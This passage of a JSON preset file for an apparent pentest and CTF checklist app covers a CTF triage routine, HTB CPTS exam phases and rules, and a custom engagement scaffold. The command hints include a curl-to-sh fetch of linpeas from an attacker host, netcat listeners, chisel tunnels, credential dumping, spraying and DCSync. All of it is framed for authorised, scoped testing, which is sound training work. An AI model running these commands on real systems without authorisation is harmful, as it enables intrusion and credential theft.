     "key": "forensics",
     "label": "Forensics",
     "kind": "challenge-category",
     "points": 400,
     "flags": [
      {
       "id": "forensics-1",
       "label": "Forensics challenge 1",
       "points": 100
      },
      {
       "id": "forensics-2",
       "label": "Forensics challenge 2",
       "points": 300
      }
     ]
    },
    {
     "key": "osint",
     "label": "OSINT",
     "kind": "challenge-category",
     "points": 400,
     "flags": [
      {
       "id": "osint-1",
       "label": "OSINT challenge 1",
       "points": 100
      },
      {
       "id": "osint-2",
       "label": "OSINT challenge 2",
       "points": 300
      }
     ]
    },
    {
     "key": "misc",
     "label": "Misc",
     "kind": "challenge-category",
     "points": 400,
     "flags": [
      {
       "id": "misc-1",
       "label": "Misc challenge 1",
       "points": 100
      },
      {
       "id": "misc-2",
       "label": "Misc challenge 2",
       "points": 300
      }
     ]
    }
   ],
   "phases": [
    {
     "id": "board-triage",
     "name": "Board Triage",
     "goal": "Pick well in the first 30 minutes so you don't sink the weekend into one 500-pointer.",
     "items": [
      {
       "label": "Read every challenge description and attachment list before starting anything",
       "hint": ""
      },
      {
       "label": "Download all attachments now — infra gets flaky when the board fills up",
       "hint": ""
      },
      {
       "label": "Note the flag format from the rules page and keep it on screen",
       "hint": ""
      },
      {
       "label": "Sort by solves: the ones climbing fastest are the ones you can actually finish",
       "hint": ""
      },
      {
       "label": "Claim challenges in team chat so two people don't solve the same thing",
       "hint": ""
      }
     ]
    },
    {
     "id": "challenge-loop",
     "name": "Working a Challenge",
     "goal": "Timebox it, note the dead ends, hand off cleanly.",
     "items": [
      {
       "label": "Check the flag isn't just sitting there in plaintext first",
       "hint": "grep -raoE 'flag\\{[^}]*\\}' ."
      },
      {
       "label": "First pass on any artefact: what is it, what's inside it",
       "hint": "file chal; strings -n 8 chal | less; binwalk -e chal"
      },
      {
       "label": "45-minute timebox, then switch or pull in a second pair of eyes",
       "hint": ""
      },
      {
       "label": "Write down what you tried that DIDN'T work — that's what you hand the next person",
       "hint": ""
      },
      {
       "label": "Re-read the description and the challenge title; the hint is almost always in there",
       "hint": ""
      }
     ]
    },
    {
     "id": "quick-hits",
     "name": "Category Quick-Hits",
     "goal": "The first thing to try in each category, so you're never staring at a blank terminal.",
     "items": [
      {
       "label": "web — endpoint discovery, then cookies / JWT / source comments",
       "hint": "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u <TARGET_URL>/FUZZ -ac"
      },
      {
       "label": "web — SSTI / SQLi / LFI probe on every reflected parameter",
       "hint": "curl '<TARGET_URL>/?name={{7*7}}'"
      },
      {
       "label": "pwn — what protections are on, and what does it read",
       "hint": "checksec --file=./chal; file ./chal"
      },
      {
       "label": "pwn — cyclic pattern to find the offset",
       "hint": "python3 -c \"from pwn import *; print(cyclic(200).decode())\""
      },
      {
       "label": "rev — strings and a live trace before you open a decompiler",
       "hint": "ltrace ./chal; strings -n 6 ./chal | grep -iE 'flag|key|pass'"
      },
      {
       "label": "crypto — check factordb / small-e / shared-modulus before doing real maths",
       "hint": "RsaCtfTool --publickey key.pub --uncipherfile cipher.bin --private"
      },
      {
       "label": "forensics — metadata, stego, carve, in that order",
       "hint": "exiftool f; zsteg -a f.png; foremost -i f"
      },
      {
       "label": "forensics — pcap: conversations first, then follow the odd one",
       "hint": "tshark -r capture.pcap -q -z conv,tcp"
      },
      {
       "label": "forensics — memory image: identify then dump processes",
       "hint": "vol3 -f mem.raw windows.pslist"
      },
      {
       "label": "osint — EXIF GPS, reverse image search, then pivot the username across platforms",
       "hint": "exiftool -gpslatitude -gpslongitude -createdate photo.jpg"
      },
      {
       "label": "misc — CyberChef 'Magic', esoteric language detection, QR/barcode decode",
       "hint": ""
      }
     ]
    },
    {
     "id": "bank-it",
     "name": "Submit & Bank",
     "goal": "Flag on the scoreboard, solve path in your notes, while it's still fresh.",
     "items": [
      {
       "label": "Submit the moment you have it — don't sit on a flag for style points",
       "hint": ""
      },
      {
       "label": "Drop the flag plus a three-line solve path into notes immediately",
       "hint": ""
      },
      {
       "label": "Keep the solve script — half of them work again next event",
       "hint": ""
      },
      {
       "label": "Re-check unsolved challenges after hint drops and late releases",
       "hint": ""
      },
      {
       "label": "Post-event: turn the three-line notes into a write-up before you forget",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "required",
     "text": "Read this event's own rules page before you start. Flag format, shared-account policy, whether flag-submission brute force is banned, and whether the infrastructure is in scope all differ per event.",
     "enforceable": "",
     "source": "",
     "confidence": "inferred"
    },
    {
     "kind": "banned",
     "text": "Attacking the scoreboard, the challenge infrastructure, or other teams is banned at essentially every event — but confirm it against this event's rules rather than assuming.",
     "enforceable": "",
     "source": "",
     "confidence": "inferred"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "requirement": "Paste the flag string exactly as submitted.",
     "source": "",
     "confidence": "inferred"
    },
    {
     "appliesTo": "*",
     "requirement": "Two to five lines describing the solve path, plus the solve script if there was one — this is what your write-up gets built from.",
     "source": "",
     "confidence": "inferred"
    }
   ],
   "reportSections": [
    "Event summary and final placement",
    "Solved challenges by category",
    "Write-ups (per challenge: description, approach, solution, flag)",
    "Unsolved challenges and how far we got",
    "Tooling and scripts worth keeping"
   ],
   "sources": [],
   "unverified": [
    "Point values, challenge counts and the 48-hour duration are placeholders. Every CTF sets its own, and many use dynamic scoring where values change as solves come in — nothing here is verified against a specific event.",
    "CTF rules are set per event, so no rule in this preset is backed by a vendor source. The event's own rules page is the only authority."
   ],
   "derivedTotal": true,
   "kind": "targets",
   "notes": [],
   "appFeatures": []
  },
  {
   "id": "htb-cpts",
   "name": "HTB CPTS",
   "icon": "🛡️",
   "tagline": "Ten days, one real-world AD network, one commercial-grade report.",
   "focus": "mixed",
   "durationMin": 14400,
   "reportHours": 0,
   "passMark": 0,
   "totalPoints": 0,
   "scoringNote": "HTB's help centre publishes a threshold example — \"scoring at least 70 out of 100 points on intermediate paths\" — which CONTRADICTS the 85/100 figure that circulates in the community. Your letter of engagement is the authority; treat both numbers as indicative only.",
   "targets": [
    {
     "key": "external",
     "label": "External perimeter host (rename as discovered)",
     "kind": "external",
     "points": 0,
     "flags": [
      {
       "id": "external-flag",
       "label": "Flag (as listed in your exam panel)",
       "points": 0
      }
     ]
    },
    {
     "key": "webapp",
     "label": "Web application (rename as discovered)",
     "kind": "webapp",
     "points": 0,
     "flags": [
      {
       "id": "webapp-flag",
       "label": "Flag (as listed in your exam panel)",
       "points": 0
      }
     ]
    },
    {
     "key": "internal",
     "label": "Internal host / pivot (rename as discovered)",
     "kind": "internal",
     "points": 0,
     "flags": [
      {
       "id": "internal-flag",
       "label": "Flag (as listed in your exam panel)",
       "points": 0
      }
     ]
    },
    {
     "key": "dc",
     "label": "Domain Controller (rename as discovered)",
     "kind": "ad-dc",
     "points": 0,
     "flags": [
      {
       "id": "dc-flag",
       "label": "Flag (as listed in your exam panel)",
       "points": 0
      }
     ]
    }
   ],
   "phases": [
    {
     "id": "pre-engagement",
     "name": "1 — Pre-Engagement",
     "goal": "Scope, objectives and evidence plumbing settled before the first packet.",
     "items": [
      {
       "label": "Read the letter of engagement end to end; copy scope and objectives into notes",
       "hint": ""
      },
      {
       "label": "Write down what is explicitly out of scope and never touch it",
       "hint": ""
      },
      {
       "label": "The report is due inside the same ten days — there is no separate report window",
       "hint": ""
      },
      {
       "label": "Open the provided report template on day 1, not day 9",
       "hint": ""
      },
      {
       "label": "Build the evidence tree before you scan anything",
       "hint": "mkdir -p engagement/{nmap,loot,screens,notes,report}"
      },
      {
       "label": "Log every terminal session from the start",
       "hint": "script -a engagement/notes/session-$(date +%F).log"
      },
      {
       "label": "Connect the exam VPN and confirm reachability",
       "hint": "sudo openvpn exam.ovpn"
      }
     ]
    },
    {
     "id": "information-gathering",
     "name": "2 — Information Gathering",
     "goal": "The whole in-scope surface mapped before a single exploit.",
     "items": [
      {
       "label": "Sweep the in-scope range for live hosts",
       "hint": "nmap -sn <NETWORK>/<CIDR> -oA nmap/sweep"
      },
      {
       "label": "Full TCP scan, per host, output saved",
       "hint": "nmap -p- --min-rate 5000 -oA nmap/all-<TARGET_IP> <TARGET_IP>"
      },
      {
       "label": "Scripts and versions on every open port",
       "hint": "nmap -sC -sV -p<PORT> -oA nmap/svc-<TARGET_IP> <TARGET_IP>"
      },
      {
       "label": "UDP top ports — SNMP, DNS and TFTP live here",
       "hint": "sudo nmap -sU --top-ports 100 -oA nmap/udp-<TARGET_IP> <TARGET_IP>"
      },
      {
       "label": "Every discovered hostname into /etc/hosts",
       "hint": "echo '<TARGET_IP> <DOMAIN>' | sudo tee -a /etc/hosts"
      },
      {
       "label": "Fingerprint every web surface and fuzz for vhosts",
       "hint": "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -ac"
      },
      {
       "label": "Harvest names and emails into a username list for later spraying",
       "hint": ""
      }
     ]
    },
    {
     "id": "vulnerability-assessment",
     "name": "3 — Vulnerability Assessment",
     "goal": "Turn the service inventory into a ranked list of attack paths.",
     "items": [
      {
       "label": "Exact product and version for every service, written into the findings sheet",
       "hint": ""
      },
      {
       "label": "searchsploit every product/version pair",
       "hint": "searchsploit <product> <version>"
      },
      {
       "label": "Content discovery against every web root",
       "hint": "feroxbuster -u http://<TARGET_IP> -x php,aspx,txt,bak -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
      },
      {
       "label": "Unauthenticated and default credentials against every login and service",
       "hint": ""
      },
      {
       "label": "SMB / LDAP null-session inventory",
       "hint": "nxc smb <TARGET_IP> -u '' -p '' --shares"
      },
      {
       "label": "Rank the paths: known CVE > default creds > app logic > brute force",
       "hint": ""
      },
      {
       "label": "Write each confirmed issue straight into the report as a draft finding",
       "hint": ""
      }
     ]
    },
    {
     "id": "exploitation",
     "name": "4 — Exploitation",
     "goal": "Foothold, with reproducible steps captured as it happens.",
     "items": [
      {
       "label": "Exploit the highest-ranked vector; screenshot each step as you go",
       "hint": ""
      },
      {
       "label": "Listener up first",
       "hint": "nc -lvnp <LPORT>"
      },
      {
       "label": "Catch the shell and upgrade to a full TTY",
       "hint": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
      },
      {
       "label": "Raw mode for a usable terminal",
       "hint": "stty raw -echo; fg"
      },
      {
       "label": "Screenshot identity and host together — that pairing is the proof",
       "hint": "id; hostname; ip a"
      },
      {
       "label": "Record the exact request or command that worked, verbatim, for Steps to Reproduce",
       "hint": ""
      },
      {
       "label": "Note every file you drop on disk for the cleanup appendix",
       "hint": ""
      }
     ]
    },
    {
     "id": "post-exploitation",
     "name": "5 — Post-Exploitation",
     "goal": "Local privilege escalation and everything this host will hand you.",
     "items": [
      {
       "label": "Linux: sudo rights first, then let the script read for you",
       "hint": "sudo -l; curl -sL http://<ATTACKER_IP>/linpeas.sh | sh"
      },
      {
       "label": "Windows: privileges before anything else",
       "hint": "whoami /all"
      },
      {
       "label": "SeImpersonate present → Potato straight to SYSTEM",
       "hint": "PrintSpoofer.exe -i -c cmd"
      },
      {
       "label": "Hunt credentials in configs, history, registry and the vault",
       "hint": "grep -riE 'password|secret|connectionstring' /var/www /opt /home 2>/dev/null"
      },
      {
       "label": "Dump local secrets once elevated",
       "hint": "nxc smb <TARGET_IP> -u <USER> -p <PASSWORD> --sam --lsa"
      },
      {
       "label": "Submit the flag in the exam panel AND record it in notes against its host",
       "hint": ""
      }
     ]
    },
    {
     "id": "lateral-movement",
     "name": "6 — Lateral Movement",
     "goal": "Pivot inside and walk the domain to Domain Admin.",
     "items": [
      {
       "label": "New interfaces or routes mean a new subnet — and a new full scan",
       "hint": "ip a; ip route; arp -a"
      },
      {
       "label": "Stand up a tunnel into the internal network",
       "hint": "./chisel client <ATTACKER_IP>:8000 R:socks"
      },
      {
       "label": "Spray every recovered credential and hash across the internal range",
       "hint": "nxc smb <NETWORK>/<CIDR> -u <USER> -p <PASSWORD> --continue-on-success"
      },
      {
       "label": "Collect BloodHound the moment you hold one domain credential",
       "hint": "bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP> -c all --zip"
      },
      {
       "label": "Kerberoast and AS-REP roast, then crack",
       "hint": "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request"
      },
      {
       "label": "Check ADCS templates before grinding ACLs",
       "hint": "certipy find -u <USER>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -vulnerable -stdout"
      },
      {
       "label": "DCSync once you hold replication rights",
       "hint": "impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -just-dc"
      },
      {
       "label": "Every new host is a fresh box — re-run local enumeration on each one",
       "hint": ""
      }
     ]
    },
    {
     "id": "proof-of-concept",
     "name": "7 — Proof-of-Concept",
     "goal": "Each finding proven reproducibly, with evidence a reviewer can follow cold.",
     "items": [
      {
       "label": "For each finding: minimal reproduction, from a clean state, in order",
       "hint": ""
      },
      {
       "label": "Proof screenshot shows command output and the target's IP in the same frame",
       "hint": ""
      },
      {
       "label": "Keep raw tool output — nmap files, BloodHound zip, secretsdump — for the appendix",
       "hint": ""
      },
      {
       "label": "Build the attack chain narrative: host → vulnerability → access → next host",
       "hint": ""
      },
      {
       "label": "Score every finding with CVSS v3.1 and record the full vector string",
       "hint": ""
      },
      {
       "label": "Confirm every flag you hold is actually submitted in the exam lab panel",
       "hint": ""
      }
     ]
    },
    {
     "id": "post-engagement",
     "name": "8 — Post-Engagement (Report)",
     "goal": "The report is the deliverable. Flags alone do not pass this exam.",
     "items": [
      {
       "label": "Fill the provided template — do not invent your own structure",
       "hint": ""
      },
      {
       "label": "Executive summary in plain English, under two pages, no jargon or code blocks",
       "hint": ""
      },
      {
       "label": "Every finding: description, impact, affected hosts, CVSS v3.1, steps to reproduce, remediation, references",
       "hint": ""
      },
      {
       "label": "Prioritised remediation summary: short, medium and long term",
       "hint": ""
      },
      {
       "label": "Appendices: exploited hosts, compromised users, cleanup log, raw tool output",
       "hint": ""
      },
      {
       "label": "Export as unencrypted PDF or ZIP, no password, under 20 MB",
       "hint": ""
      },
      {
       "label": "Upload before the ten-day clock expires — final submission ends the lab instantly and cannot be swapped",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "required",
     "text": "You have ten (10) days to upload your report on the exam lab page, counted from the moment you enter the exam. The exam lab is accessible for those ten days without restrictions.",
     "enforceable": "timer:14400",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "The report must be uploaded as an unencrypted PDF document or compressed ZIP archive, with no password protection and a maximum size of 20MB.",
     "enforceable": "report:format=pdf|zip;nopassword;max=20MB",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Vulnerabilities and remediation advice must be documented professionally using the provided template report. An instructor checks the minimum points first, then evaluates the report — a report that does not meet the quality bar fails the exam regardless of flags.",
     "enforceable": "checklist:report-template-sections",
     "source": "https://www.hackthebox.com/blog/certified-penetration-testing-specialist-cpts",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "On clicking ENTER EXAM you accept the terms and receive a letter of engagement stating all engagement details, requirements, objectives and scope. That letter, not any third-party guide, defines your exam.",
     "enforceable": "",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Clicking the final submission button instantly terminates the live exam lab network connection and closes the exam. The uploaded file cannot afterwards be changed, modified or swapped.",
     "enforceable": "confirm:final-submission",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Using AI to solve exam tasks, or to write or generate your exam report, violates the Certification Exams Terms of Service. Local reference use — checking command syntax — is permitted.",
     "enforceable": "",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Sharing exam content, flags or solutions is prohibited; Hack The Box permits published solutions only for retired content, Starting Point and Tier 0 Academy modules.",
     "enforceable": "",
     "source": "https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Denial of Service is strictly forbidden, and you must stay on your assigned targets rather than compromising unintended systems on the HTB network.",
     "enforceable": "",
     "source": "https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "Each exam voucher includes two attempts. You must submit a report on the first attempt to be eligible for the second, and you have 14 days from receiving feedback to start it. Results are returned within 20 business days.",
     "enforceable": "budget:attempts:2",
     "source": "https://www.hackthebox.com/blog/certified-penetration-testing-specialist-cpts",
     "confidence": "official"
    },
    {
     "kind": "required",
     "confidence": "official",
     "enforceable": "report:language:en",
     "text": "All reports must be composed entirely in English, and submitted ONLY through the official exam web dashboard — submissions outside it are not accepted.",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications"
    },
    {
     "kind": "required",
     "confidence": "official",
     "enforceable": "",
     "text": "You must have completed 100% of the Penetration Tester Job-Role Path before you are eligible to start the exam.",
     "source": "https://www.hackthebox.com/blog/certified-penetration-testing-specialist-cpts"
    },
    {
     "kind": "limited",
     "confidence": "official",
     "enforceable": "warn:pwnbox:4d",
     "text": "A browser Pwnbox instance stays online for a maximum of 4 continuous days; at the 4-day mark the container environment is automatically WIPED. On a 10-day exam this is a real data-loss trap — keep your evidence off the Pwnbox.",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications"
    },
    {
     "kind": "required",
     "confidence": "official",
     "enforceable": "",
     "text": "Use only one connection route at a time. Running a local OpenVPN config while a browser Pwnbox is active will drop your sessions.",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "requirement": "Screenshot showing the proof command output (id / whoami /all) and the target host's IP address in the same frame, plus the flag value recorded against the host it came from.",
     "source": "https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Every flag must also be submitted in the exam lab's own flag panel — notes in this app do not score you.",
     "source": "https://help.hackthebox.com/en/articles/12741732-academy-certifications",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Each finding needs: description, impact, affected hosts, CVSS v3.1 vector, exact steps to reproduce, remediation and references.",
     "source": "https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Raw tool output kept for the appendix — nmap scans, BloodHound collection, credential lists, secretsdump output.",
     "source": "https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Cleanup log: every account created, file dropped, service or task modified, with the time it was made.",
     "source": "https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide",
     "confidence": "official"
    }
   ],
   "reportSections": [
    "Statement of Confidentiality",
    "Engagement Contacts",
    "Executive Summary",
    "Approach",
    "Scope",
    "Assessment Overview and Recommendations",
    "Network Penetration Test Assessment Summary",
    "Summary of Findings",
    "Attack Chain / Narrative",
    "Technical Findings (per finding: description, impact, affected hosts, CVSS v3.1 vector, steps to reproduce, remediation, references)",
    "Remediation Summary (short / medium / long term)",
    "Appendix: Exploited Hosts",
    "Appendix: Compromised Users",
    "Appendix: Changes Made and Host Cleanup",
    "Appendix: Tool Output (nmap, BloodHound, credential dumps)"
   ],
   "sources": [
    "https://help.hackthebox.com/en/articles/12741732-academy-certifications",
    "https://www.hackthebox.com/blog/certified-penetration-testing-specialist-cpts",
    "https://academy.hackthebox.com/preview/certifications/htb-certified-penetration-testing-specialist",
    "https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules",
    "https://academy.hackthebox.com/course/preview/penetration-testing-process",
    "https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide",
    "https://docs.sysreptor.com/assets/reports/HTB-CPTS-Report.pdf"
   ],
   "unverified": [
    "Exact number of flags in the exam lab. HTB's own wording is only \"several flags\"; it never publishes a count. The commonly repeated \"14 flags\" figure appears only in third-party reviews, so this preset scores nothing and ships four generic target scaffolds instead of a fabricated host list.",
    "Minimum passing score. HTB says only that an instructor checks \"the minimum amount of points\". The \"85 of 100 points / 12 of 14 flags\" figure is community folklore, not an official number — passMark and totalPoints are therefore set to 0.",
    "The four pre-created targets (external host, web app, internal pivot, Domain Controller) are scaffolds derived from HTB's officially stated exam surface — \"web, external, and internal penetration testing activities against a real-world Active Directory network\" — not a disclosed network layout. Rename and add hosts as you discover them.",
    "The exact heading list of the current official report template. HTB distributes the .docx at exam start and it is not published on a page I could read; these headings come from HTB's own reporting guide plus the HTB-endorsed SysReptor HTB-CPTS demo report. Use the template you are given, not this list, if they differ.",
    "Whether a separate \"Attack Chain\" heading is mandatory in the current template, or whether the narrative belongs inside Assessment Overview. HTB's reporting guide treats attack chains as required content but not necessarily as a top-level section."
   ],
   "kind": "targets",
   "notes": [],
   "appFeatures": []
  },
  {
   "id": "custom",
   "name": "Custom",
   "icon": "⚙️",
   "tagline": "Empty scaffold for a real engagement — you set scope, targets and rules.",
   "focus": "mixed",
   "durationMin": 0,
   "reportHours": 0,
   "passMark": 0,
   "totalPoints": 0,
   "scoringNote": "",
   "targets": [],
   "phases": [
    {
     "id": "scoping",
     "name": "Scoping & Authorisation",
     "goal": "Written authorisation and an agreed scope exist before anything is touched.",
     "items": [
      {
       "label": "Signed authorisation / letter of engagement on file",
       "hint": ""
      },
      {
       "label": "In-scope assets, IP ranges, domains and explicit exclusions recorded verbatim",
       "hint": ""
      },
      {
       "label": "Testing window, permitted intensity (DoS? social engineering? production data?) agreed in writing",
       "hint": ""
      },
      {
       "label": "Emergency contacts and the escalation path for a critical finding mid-test",
       "hint": ""
      },
      {
       "label": "Evidence handling, encryption and data-retention requirements agreed",
       "hint": ""
      },
      {
       "label": "Evidence tree and session logging set up before the first scan",
       "hint": "mkdir -p engagement/{recon,loot,screens,notes,report}; script -a engagement/notes/session-$(date +%F).log"
      }
     ]
    },
    {
     "id": "recon",
     "name": "Reconnaissance",
     "goal": "See the attack surface the way the client's adversary sees it.",
     "items": [
      {
       "label": "Passive discovery: DNS, certificate transparency, public exposure",
       "hint": "subfinder -d <DOMAIN> -silent | httpx -silent -title -tech-detect"
      },
      {
       "label": "Host discovery across the agreed ranges",
       "hint": "nmap -sn <NETWORK>/<CIDR> -oA recon/sweep"
      },
      {
       "label": "Full TCP port scan per host",
       "hint": "nmap -p- --min-rate 5000 -oA recon/all-<TARGET_IP> <TARGET_IP>"
      },
      {
       "label": "UDP top ports",
       "hint": "sudo nmap -sU --top-ports 100 -oA recon/udp-<TARGET_IP> <TARGET_IP>"
      },
      {
       "label": "Cross-check every discovered asset against the scope document before touching it",
       "hint": ""
      }
     ]
    },
    {
     "id": "enumeration",
     "name": "Enumeration & Vulnerability Analysis",
     "goal": "A ranked, manually validated list of issues — no scanner output taken on trust.",
     "items": [
      {
       "label": "Service and version inventory for every open port",
       "hint": "nmap -sC -sV -p<PORT> -oA recon/svc-<TARGET_IP> <TARGET_IP>"
      },
      {
       "label": "Web content and parameter discovery across every application",
       "hint": "feroxbuster -u <TARGET_URL> -x php,aspx,txt,bak -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
      },
      {
       "label": "Authenticated review with any credentials the client provided, at every role level",
       "hint": ""
      },
      {
       "label": "Configuration, patch level and hardening review where in scope",
       "hint": ""
      },
      {
       "label": "Manually validate every scanner hit — unverified findings never reach the report",
       "hint": ""
      },
      {
       "label": "Rank by real exploitability and business impact, not by scanner severity",
       "hint": ""
      }
     ]
    },
    {
     "id": "exploitation",
     "name": "Exploitation",
     "goal": "Demonstrate the issue is real, within the agreed rules of engagement.",
     "items": [
      {
       "label": "Confirm the intended action is permitted by the rules of engagement before running it",
       "hint": ""
      },
      {
       "label": "Listener up before the payload goes out",
       "hint": "nc -lvnp <LPORT>"
      },
      {
       "label": "Capture the exact request or command that worked, verbatim",
       "hint": ""
      },
      {
       "label": "Screenshot the result with the affected asset identifier visible",
       "hint": "id; hostname; ip a"
      },
      {
       "label": "Stop and notify the client immediately on anything touching availability or real customer data",
       "hint": ""
      },
      {
       "label": "Log every artefact left on the target, with a timestamp",
       "hint": ""
      }
     ]
    },
    {
     "id": "post-exploitation",
     "name": "Post-Exploitation & Lateral Movement",
     "goal": "Establish real impact to the agreed depth, and no further.",
     "items": [
      {
       "label": "Local privilege escalation",
       "hint": "sudo -l; curl -sL http://<ATTACKER_IP>/linpeas.sh | sh"
      },
      {
       "label": "Windows privilege review",
       "hint": "whoami /all"
      },
      {
       "label": "Credential harvesting from configs, history, memory and vaults",
       "hint": "grep -riE 'password|secret|connectionstring' /var/www /opt /home 2>/dev/null"
      },
      {
       "label": "Pivot into internal segments through an agreed tunnel",
       "hint": "./chisel client <ATTACKER_IP>:8000 R:socks"
      },
      {
       "label": "Directory / identity attack paths where in scope",
       "hint": "bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -ns <DC_IP> -c all --zip"
      },
      {
       "label": "Demonstrate impact to the agreed depth — proof, not a full breach re-enactment",
       "hint": ""
      }
     ]
    },
    {
     "id": "findings",
     "name": "Evidence & Findings",
     "goal": "Every issue written up at the moment it is proven, not at the end of the week.",
     "items": [
      {
       "label": "One finding per distinct issue, drafted the day it is found",
       "hint": ""
      },
      {
       "label": "Severity with a stated rationale, plus a CVSS v3.1 vector where the client expects one",
       "hint": ""
      },
      {
       "label": "Complete affected-asset list — not just the one host you tested",
       "hint": ""
      },
      {
       "label": "Reproduction steps that work from a clean state, in order",
       "hint": ""
      },
      {
       "label": "Screenshots and raw tool output filed against the finding, timestamped",
       "hint": ""
      },
      {
       "label": "Remediation written for the team that has to implement it",
       "hint": ""
      }
     ]
    },
    {
     "id": "closeout",
     "name": "Cleanup & Reporting",
     "goal": "Environment left as found, report delivered, retest scheduled.",
     "items": [
      {
       "label": "Remove every artefact: accounts, shells, uploaded files, services, scheduled tasks",
       "hint": ""
      },
      {
       "label": "Restore any configuration you changed, and record both the change and the reversal",
       "hint": ""
      },
      {
       "label": "Peer review and QA the report before it leaves the building",
       "hint": ""
      },
      {
       "label": "Deliver over an agreed secure channel; confirm receipt",
       "hint": ""
      },
      {
       "label": "Run the debrief and agree the retest window and scope",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "requirement": "At least one screenshot or raw tool output per finding, showing the affected asset identifier (hostname, IP or URL) and a timestamp.",
     "source": "",
     "confidence": "inferred"
    },
    {
     "appliesTo": "*",
     "requirement": "A from-scratch reproduction per finding: the exact request or command sequence, in order.",
     "source": "",
     "confidence": "inferred"
    },
    {
     "appliesTo": "*",
     "requirement": "A cleanup log entry for every change made to a target, with the time it was made and the time it was reverted.",
     "source": "",
     "confidence": "inferred"
    }
   ],
   "reportSections": [
    "Executive Summary",
    "Scope and Rules of Engagement",
    "Assessment Timeline and Contacts",
    "Methodology",
    "Attack Narrative / Kill Chain",
    "Summary of Findings",
    "Detailed Findings (per finding: severity and CVSS, affected assets, description, impact, evidence, steps to reproduce, remediation, references)",
    "Remediation Roadmap and Strategic Recommendations",
    "Conclusion",
    "Appendix: Methodology Detail and Tooling",
    "Appendix: Raw Scan and Tool Output",
    "Appendix: Credentials Tested and Accounts Used",
    "Appendix: Changes Made and Cleanup Log"
   ],
   "sources": [],
   "unverified": [
    "Nothing in this preset is a vendor claim — it is a blank professional scaffold. Scope, rules of engagement, severity scheme and report structure all come from your own engagement contract and your firm's template, and must be set per engagement."
   ],
   "kind": "targets",
   "notes": [],
   "appFeatures": []
  },
  {
   "id": "cks",
   "name": "CKS — Certified Kubernetes Security Specialist",
   "icon": "🛡️",
   "tagline": "For the CKA-holder hardening real clusters: 2 hours, 15–20 weighted security tasks, 67% to pass, and one wrong context away from losing a whole task.",
   "kind": "tasks",
   "focus": "kubernetes",
   "status": "active",
   "statusNote": "Active and currently offered. It was restructured, not retired: on 15 Oct 2024 the Linux Foundation republished the CKS curriculum with changed domain weights and relaxed the CKA prerequisite (a CKA with status Achieved, Renewed OR Expired now qualifies — it no longer has to be Active). Current published curriculum is CKS v1.34; the exam environment runs Kubernetes v1.35. Source: https://training.linuxfoundation.org/blog/now-updated-cks-exam/",
   "durationMin": 120,
   "taskCount": 16,
   "format": "hands-on performance-based; remotely proctored (PSI) remote-desktop Linux environment with an in-VM terminal and one allowed documentation browser; 15–20 tasks solved from the command line across several pre-configured Kubernetes clusters, each task naming the context it must be performed in",
   "passMark": 67,
   "curriculumVersion": "CKS v1.34 (exam environment: Kubernetes v1.35)",
   "retakeNote": "One retake included with the exam purchase ($445 USD exam-only). Certification is valid for 2 years from the date passed (certifications earned before 1 Apr 2024 carry 3-year validity). Prerequisite: the CKA exam must have been taken and passed prior to attempting CKS — since 15 Oct 2024 a CKA with status Achieved, Renewed or Expired all satisfy the prerequisite; it does NOT have to be Active. Sources: https://training.linuxfoundation.org/certification/certified-kubernetes-security-specialist/ , https://docs.linuxfoundation.org/tc-docs/certification/faq-cka-ckad-cks , https://training.linuxfoundation.org/blog/now-updated-cks-exam/ The purchase also includes exam-simulator access: two attempts with 36 hours of access each (Killer.sh). For an exam decided by per-task pace, those two timed windows are the most useful thing in the package.",
   "domains": [
    {
     "id": "cluster-setup",
     "name": "Cluster Setup",
     "weight": 15,
     "competencies": [
      "Use Network security policies to restrict cluster level access",
      "Use CIS benchmark to review the security configuration of Kubernetes components (etcd, kubelet, kubedns, kubeapi)",
      "Properly set up Ingress objects with TLS",
